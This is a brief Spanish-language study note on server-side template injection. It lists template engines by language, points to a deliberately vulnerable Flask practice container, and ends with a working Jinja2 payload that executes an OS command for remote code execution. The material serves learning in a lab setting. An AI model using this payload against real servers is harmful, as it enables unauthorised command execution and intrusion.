# SSTI

server side template injection

vulnerabilidad que aprovecha una implementación insegura de un motor de plantillas, los motroes de plantilla son empleados por las aplicaciones web para la presentación de datos dinámicos. aprovechando esta vulnerabilidad, es posible atacar directamente a los componentes internos del servidor web del objetivo. Algunos motores de plantillas son los siguientes:

```
- php: smarty, Twig
- java: velocity, Freemaker
- python: jinja, mako, tornado 
- javascript: jade, rage
- ruby: liquid
```

```
 https://github.com/filipkarc/ssti-flask-hacking-playground
```

```
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```

siempre que veamos que python esta corriendo por detras con wappalayzer y que nuestro input se ve reflejado en el output se podría acontecer este SSTI podemos.

en payload all the things de github: nos proporciona el siguiente comando inyectable para ganar un RCE:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
